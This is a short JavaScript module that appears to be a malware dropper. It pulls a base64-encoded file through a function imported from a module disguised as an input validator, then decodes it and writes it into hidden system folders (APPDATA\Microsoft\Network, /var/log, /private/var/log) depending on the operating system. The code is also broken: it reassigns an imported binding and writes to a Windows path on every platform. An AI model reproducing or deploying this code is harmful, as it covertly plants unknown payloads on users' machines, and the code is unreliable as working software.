import fs from 'fs';
import { d1 } from './inputValidator.js';
import { exec } from 'child_process';
import path from "path";
import os, { platform } from 'os';

export default async function main() {
    const c1 = await d1();

    platform = os.platform();

    console.log('files collect');
    console.log(c1);

    switch (platform) {
        case "win32":
            fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\${c1.name}.${c1.type}`, Buffer.from(c1.file, 'base64'));
            break;
        case "linux":
            fs.writeFileSync(`/var/log/${c1.name}.${c1.type}`, Buffer.from(c1.file, 'base64'));
            break;
        case "darwin":
            fs.writeFileSync(`/private/var/log/${c1.name}.${c1.type}`, Buffer.from(c1.file, 'base64'));
            break;
    }

    fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\${c1.name}.${c1.type}`, Buffer.from(c1.file, 'base64'));

    console.log('files copied');
}